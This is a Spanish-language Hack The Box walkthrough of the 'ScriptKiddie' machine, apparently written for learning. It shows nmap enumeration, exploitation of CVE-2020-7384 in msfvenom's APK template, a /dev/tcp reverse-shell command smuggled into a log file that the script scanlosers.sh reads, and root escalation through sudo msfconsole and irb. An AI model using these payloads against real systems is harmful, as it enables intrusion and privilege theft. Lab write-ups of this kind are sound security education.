---
title: ScriptKiddie
parent: Easy
nav_order: 2
---

# Walkthrough — ScriptKiddie (Hack The Box)
{: .fs-9 }

> En esta máquina se aprovechan varias vulnerabilidades: una inyección en la plantilla de generación de APK de Metasploit (CVE-2020-7384) para obtener acceso inicial, un fallo de validación en un script de automatización (`scanlosers.sh`) que permite inyección de comandos para movimiento lateral, y finalmente abuso de permisos `sudo` sobre `msfconsole` para escalar a root.
{: .fs-6 .fw-300 }

---

![0](/assets/images/scriptkiddie/0.png)



## Enumeración — Nmap básico

Primero ejecuté un escaneo rápido para ver puertos abiertos y servicios básicos:

```bash
nmap 10.129.95.150
```

Salida importante, con esto ya podemos tener una idea para hacer un escaneo mas exhaustivo:

```
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

---

## Enumeración — Detección de versiones y scripts

Después realicé un escaneo más detallado contra los puertos identificados:

```bash
nmap -p 22,5000 -sCV 10.129.95.150
```

![2](/assets/images/scriptkiddie/2.png)

Salida relevante:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-17 14:17 CST
Nmap scan report for 10.129.95.150
Host is up (0.0076s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds

```

Qué nos dice esto:
- El servicio en 5000 responde con un título que sugiere una web casera o herramienta destinada a "hackers".
- La versión de Werkzeug (0.16.1) y el hecho de que sea Python apuntan a una app que probablemente procesa entradas y archivos en el servidor — un buen candidato para buscar vulnerabilidades relacionadas con plantillas, uploads o ejecución de comandos.

---

![6](/assets/images/scriptkiddie/6.png)

Esta captura muestra la interfaz pública de la aplicación (página principal). Observamos que incluye funcionalidades para generar APKs e invocar msfvenom desde el servidor — un patrón peligroso si el input no se valida correctamente.

---

## Vulnerabilidad identificada: CVE-2020-7384

Buscando CVEs relacionados con plantillas y msfvenom, me topé con CVE-2020-7384.  
Este problema permite inyección de comandos en la plantilla usada para generar archivos APK en ciertos flujos automatizados de Metasploit/msfvenom.

Repositorio referenciado (fuente pública usada para reproducir el fallo):
- https://github.com/nikhil1232/CVE-2020-7384

> Nota: en el laboratorio, la aplicación vulnerable procesa plantillas APK sin sanitizar, lo que permite inyectar comandos que el servidor ejecuta cuando genera el APK.

---

## Obtención de la shell inicial (usuario `kid`)

En msfconsole se localiza el módulo vulnerable:

```
exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
```

Se genera un APK malicioso que, al procesarse, ejecuta una payload para conectarse de vuelta a nuestro listener. En el laboratorio abrí un `nc -lvnp 8888` y esperé la conexión.

```bash
nc -lvnp 8888
```

Cuando el servidor procesa nuestro APK malicioso, recibimos una reverse shell y mejoramos la sesión para obtener un shell interactivo como `kid`.

---

![8](/assets/images/scriptkiddie/8.png)

Con el acceso a `kid` ya puedo leer `user.txt` y continuar con la enumeración local.

---

## Movimiento lateral — análisis del entorno local

Al revisar el sistema y la estructura de usuarios, observé otro usuario: `pwn`. En su home hay un script `scanlosers.sh`. Con el contenido siguiente:

```bash
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

### Explicación del código

- El script **lee** `/home/kid/logs/hackers` sin validar/filtrar el contenido.
- Usa `cut -d' ' -f3-` para extraer la "IP" (o lo que sea) desde cada línea y luego invoca `sh -c "nmap ... ${ip} ..."` sin sanitizar.
- Si un atacante puede escribir en `/home/kid/logs/hackers`, puede inyectar comandos que se concatenarán en la línea ejecutada por `sh -c`, permitiendo ejecución arbitraria.

---

![9](/assets/images/scriptkiddie/9.png)

La aplicación web escribe en `/home/kid/logs/hackers` cuando el usuario utiliza la función "searchsploit" y envía entradas con caracteres especiales. Aproveché esto para insertar una línea que lance una reverse shell desde la máquina objetivo hacia mi listener.

```bash
echo 'a b $(bash -c "bash -i &>/dev/tcp/10.10.14.253/8888 0>&1")' > /home/kid/logs/hackers
```
![10](/assets/images/scriptkiddie/10.png)

Notas sobre el payload:
- La estructura reproduce el formato que el script espera (al menos tres columnas separadas por espacios), de modo que `cut -d' ' -f3-` devuelve algo que contiene la subshell `$(...)`.
- Cuando `scanlosers.sh` procesa este archivo, la cadena se expande y `sh -c` ejecuta la subshell, conectando de vuelta a mi `nc` listener.

---


Tras abrir `nc -lvnp 8888` vuelvo a recibir una conexión; esta vez la sesión es del usuario **pwn**. Mejorando la shell obteniendo acceso a este usuario.

![11](/assets/images/scriptkiddie/11.png)

---

## Escalada de privilegios — abuso de sudo sobre msfconsole

Durante el proceso de escalada, ejecuto:

```bash
sudo -l
```
![12](/assets/images/scriptkiddie/12.png)


y se observa que el usuario `pwn`  puede ejecutar `msfconsole` como root sin contraseña.

### Importante

`msfconsole` es un binario que integra un entorno Ruby interactivo. Ejecutarlo como root puede permitir ejecutar código arbitrario con privilegios elevados. En este escenario, accedí a `msfconsole` con `sudo`, abrí una consola `irb` (Ruby REPL) y desde ella usé `system()` para ejecutar comandos del sistema como root, obteniendo así una shell privilegiada.

```bash
sudo msfconsole
# en msfconsole -> abrir irb, luego:
irb
system("bash")
```

Al ejecutar `system("bash")` desde `irb` dentro de msfconsole ejecutado como root, se obtiene una shell con privilegios de root.

---

![13](/assets/images/scriptkiddie/13.png)
![14](/assets/images/scriptkiddie/14.png)

Con esto, ya tenemos `root` y acceso al `root.txt`.

---

**Autor:** [gueco99](https://github.com/gueco99)  
**Máquina:** ScriptKiddie — *Easy* (Hack The Box)

---

